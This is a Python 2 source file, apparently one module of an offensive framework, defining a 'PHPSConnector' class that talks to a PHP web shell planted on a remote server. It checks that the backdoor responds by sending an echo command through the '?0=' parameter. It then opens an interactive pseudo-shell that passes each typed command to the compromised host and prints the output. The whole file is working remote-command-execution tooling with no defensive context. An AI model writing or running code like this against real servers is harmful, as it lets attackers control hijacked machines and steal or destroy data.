import urllib, urllib2, requests
import sys,os
import re

sys.path.append(os.path.dirname(__file__) + "../core")

import options

class PHPSConnector:
    def __init__(self, hostname, ssl):
        try:
            self.prefix = "http://"
            if(ssl == "True"):
                self.prefix = "https://"
            self.host = str(self.prefix)+str(hostname)
        except Exception as e:
            print "Failed to create object PHPSConnector : "+str(e)
    def options(self, option):
        try:
            if(option == "host"):
                return self.host
        except Exception as e:
            print "Failed to execute PHPSconnector.options() : "+str(e)
    def connect(self):
        try:
            checker = urllib2.urlopen(self.host+str("?0=echo%20S1L3NT")).read()
            if("S1L3NT" in checker):
                print "[+] Successfully connected to remote host."
                return True
            else:
                print "[-] Failed to connect to remote host."
                return False
            return False
        except urllib2.HTTPError, e:
            print "[-] Failed to connect to remote host / Not found"
            pass
        except Exception as e:
            print "Failed to execute PHPSconnector.connect() : "+str(e)
    def raiseShell(self, session):
        try:
            uname = urllib2.urlopen(self.host+"?0=uname%20-a").read()
            if(uname != ""):
                print "[+] Successfully interacted with session #"+str(session)
                print uname
                while(True):
                    if(os.name != "nt"):
                        com = "\033[91mPHPSConnector SH\033[0m $ "
                    else:
                        com = "PHPSConnector SH $ "
                    command = raw_input(com)
                    if(command == "back"):
                        break
                    else:
                        cm = command.replace(" ", "%20")
                        data = urllib2.urlopen(self.host+"?0="+str(cm)).read()
                        if(data != ""):
                            print data
            else:
                print "[-] Interaction failed."
        except Exception as e:
            print "Failed to execute PHPSConnector.raiseShell() : "+str(e)
